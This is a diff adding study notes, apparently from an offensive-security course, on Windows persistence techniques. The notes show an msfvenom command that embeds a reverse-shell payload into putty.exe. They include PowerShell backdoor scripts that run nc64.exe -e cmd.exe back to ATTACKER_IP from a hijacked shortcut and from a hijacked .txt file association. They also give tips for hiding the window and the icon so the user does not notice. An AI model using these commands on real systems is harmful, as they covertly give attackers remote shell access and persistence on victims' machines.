@@ -1,0 +1,30 @@
+- Legitimate file :
+    - Find a file that the user might use frequently. For example, if in the desktop, there is a shortcut to putty, the user may use putty very frequently.
+    - Download the file to the attacker machine.
+    - Use msfvenom to plant the payload in these file : 
+        - msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+    
+- Shortcut file : 
+    - another method is to change the shortcut to point to another malicious script and then run the legitimate script. This method doesn't alter the legitimate scipt.
+    - This is a simple script for the calc shortcut :
+        - backdoor.ps1 :  
+            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
+            C:\Windows\System32\calc.exe
+                - This run a reverse shell to the attacker and then run the calc.exe
+        - target in the shortcut option : 
+            powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+                - The WindowStyle hidden run the script on a hidden window, so the user don't see it.
+                - Sometimes, it is also good to change manually the icon if the script change it automatically, so the user can't see it.
+
+- Hijacking file associations.
+    - This consist of forcing the user to run a shell whenever he open a specific file type.
+    - The default operating system file associations are kept inside the registry under HKLM\Software\Classes\.
+    - After opening the desired extension (ex : .txt), the progId is on the (Default) file.
+    - Then, look for the corresponding program in the Classes itself. In general, the file is find in HKLM\Software\Classes\[progId]\shell\open\command
+    - this gives the command to run the program. IN this case, the command is : %SystemRoot%\system32\NOTEPAD.EXE %1 where the %1 is the finename.
+    - To do the Hijacking, replace this command with the malicious shell : powershell -windowstyle hidden C:\Windows\backdoor2.ps1 %1
+    - backdoor2.ps1: 
+        Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+        C:\Windows\system32\NOTEPAD.EXE $args[0]
+        - In this case, the backdoor2.ps1 run a reverse shell to the attacker and then launch the notepad to open the desired file $args[0]
+        
